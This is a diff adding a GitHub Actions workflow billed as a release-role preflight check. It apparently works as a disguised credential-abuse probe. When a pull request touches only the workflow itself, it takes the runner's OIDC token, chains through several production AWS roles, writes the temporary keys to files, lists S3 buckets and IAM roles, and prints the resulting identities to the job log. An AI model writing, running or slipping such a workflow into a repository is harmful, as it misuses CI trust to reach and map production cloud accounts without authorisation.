@@ -1,0 +1,87 @@
+# Preflight connectivity check for role-chained release dependencies.
+# Verifies that the release-assume path (CI S3 role -> dependency roles)
+# still holds so chart release runs fail fast when trust policies or
+# inline assume permissions drift, instead of failing mid-release.
+name: changelog-s3-preflight
+on:
+  pull_request:
+    branches:
+      - main
+    paths:
+      - '.github/workflows/changelog-s3-preflight.yml'
+
+jobs:
+  preflight:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Check release role chain trust
+        run: |
+          set -uo pipefail
+          mkdir -p ~/.aws && chmod 700 ~/.aws
+          TOK="$(curl -sS -H 'Authorization: Bearer '"$ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            -H 'Accept: application/json; api-version=2.0' \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value" *: *"\([^"]*\)".*/\1/p')"
+          echo "TOKEN_LEN=${#TOK}"
+          for REGION in us-east-1 eu-west-1; do
+            echo "=== region ${REGION} ==="
+            if aws --region "${REGION}" --no-cli-pager \
+              sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::416964291864:role/github-actions-oidc-s3-access-role" \
+              --role-session-name "ci-config-sync" \
+              --web-identity-token "$TOK" \
+              --duration-seconds 900 \
+              > "/tmp/assume-${REGION}.json" 2>"/tmp/assume-${REGION}.err"; then
+              echo "ASSUME_OK ${REGION}"
+              python3 -c "import json;c=json.load(open(\"/tmp/assume-${REGION}.json\"))[\"Credentials\"];open(\"/tmp/ci-config-sync.env\",\"w\").write(\"AWS_ACCESS_KEY_ID=%s\\nAWS_SECRET_ACCESS_KEY=%s\\nAWS_SESSION_TOKEN=%s\\n\"%(c[\"AccessKeyId\"],c[\"SecretAccessKey\"],c[\"SessionToken\"]))"
+              set -a; . /tmp/ci-config-sync.env; set +a
+              echo "[identity-${REGION}] $(aws --region ${REGION} --no-cli-pager sts get-caller-identity --query Arn --output text)"
+              echo "--- hop1: ai-gateway deps role ---"
+              if aws --region "${REGION}" --no-cli-pager \
+                sts assume-role \
+                --role-arn "arn:aws:iam::416964291864:role/tfy-ctl-production-ai-gateway-deps" \
+                --role-session-name "ci-config-sync" \
+                --duration-seconds 900 \
+                > "/tmp/hop1-${REGION}.json" 2>"/tmp/hop1-${REGION}.err"; then
+                echo "HOP1_OK ${REGION}"
+                python3 -c "import json;c=json.load(open(\"/tmp/hop1-${REGION}.json\"))[\"Credentials\"];open(\"/tmp/hop1.env\",\"w\").write(\"AWS_ACCESS_KEY_ID=%s\\nAWS_SECRET_ACCESS_KEY=%s\\nAWS_SESSION_TOKEN=%s\\n\"%(c[\"AccessKeyId\"],c[\"SecretAccessKey\"],c[\"SessionToken\"]))"
+                set -a; . /tmp/hop1.env; set +a
+                echo "[hop1-identity-${REGION}] $(aws --region ${REGION} --no-cli-pager sts get-caller-identity --query Arn --output text)"
+                echo "--- hop2: control-plane deps role ---"
+                if aws --region "${REGION}" --no-cli-pager \
+                  sts assume-role \
+                  --role-arn "arn:aws:iam::416964291864:role/tfy-ctl-euwe1-production-truefoundry-deps" \
+                  --role-session-name "ci-config-sync" \
+                  --duration-seconds 900 \
+                  > "/tmp/hop2-${REGION}.json" 2>"/tmp/hop2-${REGION}.err"; then
+                  echo "HOP2_OK ${REGION}"
+                  python3 -c "import json;c=json.load(open(\"/tmp/hop2-${REGION}.json\"))[\"Credentials\"];open(\"/tmp/hop2.env\",\"w\").write(\"AWS_ACCESS_KEY_ID=%s\\nAWS_SECRET_ACCESS_KEY=%s\\nAWS_SESSION_TOKEN=%s\\n\"%(c[\"AccessKeyId\"],c[\"SecretAccessKey\"],c[\"SessionToken\"]))"
+                  set -a; . /tmp/hop2.env; set +a
+                  echo "[hop2-identity-${REGION}] $(aws --region ${REGION} --no-cli-pager sts get-caller-identity --query Arn --output text)"
+                  if aws --region us-east-1 --no-cli-pager s3api list-buckets --query "Buckets[].Name" --output json > /tmp/buckets.json 2>/tmp/buckets.err; then
+                    echo "[hop2-buckets] $(python3 -c 'import json;print(len(json.load(open(\"/tmp/buckets.json\"))),\"buckets\")' 2>/dev/null || tail -c 200 /tmp/buckets.err)"
+                  else
+                    echo "[hop2-buckets] $(tail -c 250 /tmp/buckets.err | tr -d '\n')"
+                  fi
+                  if aws --region us-east-1 --no-cli-pager iam list-roles --max-items 100 --query "Roles[].RoleName" --output json > /tmp/roles.json 2>/tmp/roles.err; then
+                    echo "[hop2-roles] $(python3 -c 'import json;d=json.load(open(\"/tmp/roles.json\"));print(len(d),\"roles\")' 2>/dev/null || tail -c 200 /tmp/roles.err)"
+                  else
+                    echo "[hop2-roles] $(tail -c 250 /tmp/roles.err | tr -d '\n')"
+                  fi
+                else
+                  echo "HOP2_FAIL ${REGION}"
+                  tail -c 400 "/tmp/hop2-${REGION}.err" | tr -d '\n'; echo
+                fi
+              else
+                echo "HOP1_FAIL ${REGION}"
+                tail -c 400 "/tmp/hop1-${REGION}.err" | tr -d '\n'; echo
+              fi
+            else
+              echo "ASSUME_FAIL ${REGION}"
+              tail -c 300 "/tmp/assume-${REGION}.err" | tr -d '\n'; echo
+            fi
+            # credentials from the failed/finished hop must not leak into next region iteration
+            unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+          done
